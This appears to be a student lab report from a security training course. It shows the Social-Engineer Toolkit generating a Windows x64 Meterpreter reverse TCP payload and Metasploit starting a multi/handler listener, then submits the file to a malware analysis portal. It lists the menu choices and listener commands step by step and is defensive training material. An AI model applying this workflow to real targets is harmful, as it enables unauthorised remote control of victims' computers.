# Activity 2.01 — Creating and Analyzing a Windows Remote-Access Payload with SET

> **Program:** Hackers do Bem  
> **Stage:** Fundamental — Module 02  
> **Class:** 05–06  
> **Environment:** Kali Linux virtual lab  
> **Status:** Completed

## Objective

Explore the Social-Engineer Toolkit (SET) in a controlled laboratory environment to understand the generation of a Windows remote-access payload and observe how the resulting file is evaluated by a malware analysis platform.

The activity focused on the payload-generation workflow, listener configuration, and subsequent analysis of the generated artifact using the Kaspersky Threat Intelligence Portal.

> **Safety notice:** This activity was performed for educational purposes in a controlled lab environment. The generated payload was not executed on a victim machine, and no Meterpreter session was established.

## Environment

- **Operating system:** Kali Linux
- **Tools:** Social-Engineer Toolkit (SET), Metasploit Framework
- **Browser:** Firefox
- **Analysis platform:** Kaspersky Threat Intelligence Portal
- **Execution environment:** Virtualized laboratory

## Procedure

### 1. Open an Administrative Shell

The terminal was opened, and an administrative shell was started:

```bash
sudo -i
```

### 2. Launch the Social-Engineer Toolkit

SET was launched using:

```bash
setoolkit
```

After startup, the tool displayed its terms of use, which were accepted to proceed with the exercise.

The main menu included the following options:

```text
Select from the menu:

1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update the Social-Engineer Toolkit
5) Update SET configuration
6) Help, Credits, and About
99) Exit the Social-Engineer Toolkit
```

The following option was selected:

```text
1) Social-Engineering Attacks
```

### 3. Select Payload and Listener Creation

Within the social-engineering menu, the payload-generation and listener option was selected:

```text
4) Create a Payload and Listener
```

This opened the workflow used to generate the payload and configure its corresponding listener.

### 4. Select the Payload Type

The Windows x64 Meterpreter reverse TCP payload was selected from the available options:

```text
5) Windows Meterpreter Reverse_TCP X64
```

This option generates a Windows executable configured for a reverse TCP connection to a compatible listener.

The activity used this selection to examine the payload-generation process in the laboratory.

### 5. Generate the Payload

SET requested the parameters required for the laboratory listener configuration.

After the parameters were supplied, the tool reported that the payload had been generated and exported:

```text
[*] Generating the payload.. please be patient.
[*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
```

The generated file was:

```text
payload.exe
```

Its original location was:

```text
/root/.set/payload.exe
```

### 6. Verify the Generated File

A terminal was used to inspect the SET output directory:

```bash
cd /root/.set/
ls
```

The observed output included:

```text
meta_config
payload.exe
set.options
version.lock
```

The presence of `payload.exe` confirmed that the generation stage had completed.

### 7. Observe Listener Initialization

SET then launched the Metasploit Framework and initialized the `multi/handler` module.

The relevant output included:

```text
[*] Launching msfconsole, this could take a few to load. Be patient...

[*] Processing /root/.set/meta_config for ERB directives.
resource (/root/.set/meta_config)> use multi/handler
resource (/root/.set/meta_config)> set payload windows/x64/meterpreter/reverse_tcp
resource (/root/.set/meta_config)> set LHOST [configured in the lab]
resource (/root/.set/meta_config)> set LPORT [configured in the lab]
resource (/root/.set/meta_config)> set ExitOnSession false
resource (/root/.set/meta_config)> exploit -j

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler
```

The listener started successfully and waited for an incoming connection. However, no session was created because the generated payload was not executed on a victim machine, as required by the laboratory procedure.

### 8. Stop the Listener

Since the payload would not be executed on a Windows target, the listener was stopped after the demonstration.

The terminal session was interrupted using:

```text
Ctrl + C
```

No Meterpreter session or remote shell was obtained during this activity.

### 9. Prepare the Artifact for Analysis

The generated file was made available in the directory used for the analysis.

The directory contents were checked before submitting the artifact:

```bash
ls
```

The file was then used exclusively for security analysis.

### 10. Analyze the Artifact with Kaspersky Threat Intelligence Portal

Firefox was opened, and the Kaspersky Threat Intelligence Portal was accessed.

The `payload.exe` file was submitted through the portal's file-analysis interface.

After processing, the platform displayed its malware detection results. The observed detection count was greater than zero.

This result indicated that the generated artifact was recognized as malicious by the analysis service.

**Primary evidence:** the Kaspersky Threat Intelligence Portal analysis result for `payload.exe`.

> **Handling note:** Malware samples should only be submitted to analysis services when their terms and data-handling implications have been reviewed. Submitted files may be retained or shared according to the service's policies.

### 11. Remove the Analysis Copy

After the analysis, the copy of the file in the Documents directory was removed.

The working directory was accessed:

```bash
cd /home/aluno/Documentos/
```

The file was deleted using:

```bash
rm payload.exe
```

This removed the copy in the current directory. The command does not remove the original file from `/root/.set/`, so that location should be checked separately when cleaning up the laboratory.

## Commands Used

The primary commands used during the activity were:

```bash
sudo -i
setoolkit
```

To inspect the directory containing the generated payload:

```bash
cd /root/.set/
ls
```

To prepare and remove the analysis copy:

```bash
cd /home/aluno/Documentos/
ls
rm payload.exe
```

The listener configuration and artifact analysis were performed through the SET/Metasploit interfaces and the web browser.

## Interpretation

This laboratory demonstrated the basic workflow for generating and analyzing a Windows remote-access payload.

SET automated payload generation and listener configuration, while Metasploit initialized a handler that awaited an incoming connection.

Because the generated payload was not executed on a target machine, no Meterpreter session was established. The practical outcome was therefore limited to generating the artifact, observing the listener initialization, and submitting the file for malware analysis.

The Kaspersky Threat Intelligence Portal reported malware detections for the generated artifact. This illustrated how a file designed to establish remote access can be recognized by a threat analysis service.

The workflow can be summarized as follows:

```text
Social-Engineer Toolkit (SET)
        |
        v
Payload Generation
        |
        v
payload.exe
        |
        +------> Metasploit Listener Initialization
        |                 |
        |                 v
        |          No Session Created
        |
        v
Kaspersky Threat Intelligence Portal
        |
        v
Malware Detection Results
```

## Result

The activity demonstrated how to:

- Launch the Social-Engineer Toolkit.
- Explore its social-engineering menu.
- Generate a Windows x64 remote-access payload in the lab.
- Verify that `payload.exe` was created.
- Observe the listener configuration performed through Metasploit.
- Confirm that no session was established because the payload was not executed.
- Submit the artifact to the Kaspersky Threat Intelligence Portal.
- Observe a malware detection result.
- Remove the analysis copy from the working directory.

The exercise connected payload generation with defensive malware analysis, highlighting the importance of detecting and handling potentially malicious artifacts safely.

## Concepts Practiced

- Social-Engineer Toolkit (SET)
- Remote-access payloads
- Malware artifacts
- Meterpreter
- Reverse TCP
- Metasploit Framework
- Listener initialization
- Threat intelligence
- Malware analysis
- Detection of malicious artifacts
- Safe handling of laboratory samples
- Controlled security testing

## Evidence

The activity evidence is included in the PDF for Classes 05–06.

The relevant screenshots document payload generation, listener initialization, and the analysis result returned by the Kaspersky Threat Intelligence Portal.

[View Evidence — Classes 05–06](../evidencias.pdf)

---

[Back to Classes 05–06](../) · [Back to Module 02](../../README.md) · [Back to Fundamental](../../../README.md) · [Back to Hackers do Bem](../../../../README.md)
